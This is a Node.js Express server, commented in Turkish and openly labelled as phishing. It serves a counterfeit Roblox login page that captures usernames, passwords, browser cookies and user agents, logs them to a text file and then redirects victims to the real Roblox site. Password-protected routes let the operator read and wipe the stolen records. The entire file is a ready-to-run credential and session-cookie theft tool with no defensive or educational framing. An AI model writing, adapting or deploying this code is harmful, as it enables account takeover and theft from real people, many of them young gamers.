const express = require('express');
const fs = require('fs');
const path = require('path');
const app = express();

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// --- PHISHING SAYFASI (ana sayfa) ---
app.get('/', (req, res) => {
    res.send(`
    <!DOCTYPE html>
    <html>
    <head>
        <title>Roblox - Giriş</title>
        <style>
            body { font-family: Arial; background: #1a1a2e; display: flex; justify-content: center; align-items: center; height: 100vh; margin:0; }
            .box { background: #16213e; padding: 40px; border-radius: 20px; color: white; width: 350px; box-shadow: 0 0 30px rgba(0,170,255,0.2); }
            input { width: 100%; padding: 12px; margin: 10px 0; border-radius: 8px; border: none; box-sizing: border-box; }
            button { background: #00aaff; color: white; padding: 12px; border: none; border-radius: 8px; width: 100%; font-weight: bold; cursor: pointer; font-size:16px; }
            button:hover { background: #0088cc; }
            .logo { font-size: 32px; text-align: center; margin-bottom: 20px; }
            .footer { text-align:center; margin-top:15px; font-size:12px; color:#aaa; }
            .footer a { color:#00aaff; text-decoration:none; }
        </style>
    </head>
    <body>
        <div class="box">
            <div class="logo">🎮 Roblox</div>
            <input type="text" id="username" placeholder="Kullanici adi / E-posta"><br>
            <input type="password" id="password" placeholder="Sifre"><br>
            <button onclick="sendData()">Giris Yap</button>
            <div class="footer"><a href="#">Kaydol</a> · <a href="#">Sifremi unuttum</a></div>
        </div>
        <script>
            function sendData() {
                const user = document.getElementById('username').value;
                const pass = document.getElementById('password').value;
                const cookies = document.cookie;

                fetch('/collect', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        username: user,
                        password: pass,
                        cookies: cookies,
                        userAgent: navigator.userAgent
                    })
                })
                .then(() => {
                    window.location.href = 'https://www.roblox.com/login';
                })
                .catch(() => {
                    window.location.href = 'https://www.roblox.com/login';
                });
            }
        </script>
    </body>
    </html>
    `);
});

// --- VERI TOPLAMA ENDPOINT'I ---
app.post('/collect', (req, res) => {
    const data = req.body;
    const log = `
[${new Date().toISOString()}]
Kullanici: ${data.username || 'YOK'}
Sifre: ${data.password || 'YOK'}
Cerez: ${data.cookies || 'YOK'}
Tarayici: ${data.userAgent || 'YOK'}
----------------------------------------`;

    fs.appendFile('gelenler.txt', log, (err) => {
        if (err) console.error('Yazma hatasi:', err);
    });

    console.log('YENI VERI GELDI:', data);
    res.send('OK');
});

// --- TOPLANAN VERILERI GORUNTULEME (opsiyonel, sifreli) ---
app.get('/logs', (req, res) => {
    if (req.query.key !== 'Zeta2024') {
        return res.status(403).send('Erisim reddedildi');
    }
    fs.readFile('gelenler.txt', 'utf8', (err, data) => {
        if (err) return res.send('Henuz veri yok.');
        res.send('<pre>' + data + '</pre>');
    });
});

// --- LOGLARI TEMIZLEME (opsiyonel) ---
app.get('/clear', (req, res) => {
    if (req.query.key !== 'Zeta2024') return res.status(403).send('Yasak');
    fs.writeFile('gelenler.txt', '', () => {});
    res.send('Loglar temizlendi.');
});

const PORT = 3000;
app.listen(PORT, function() {
    console.log('Zeta sunucusu calisiyor: http://localhost:' + PORT);
    console.log('Ana sayfa (phishing): /');
    console.log('Veri toplama: /collect (POST)');
    console.log('Loglari goruntule: /logs?key=Zeta2024');
});
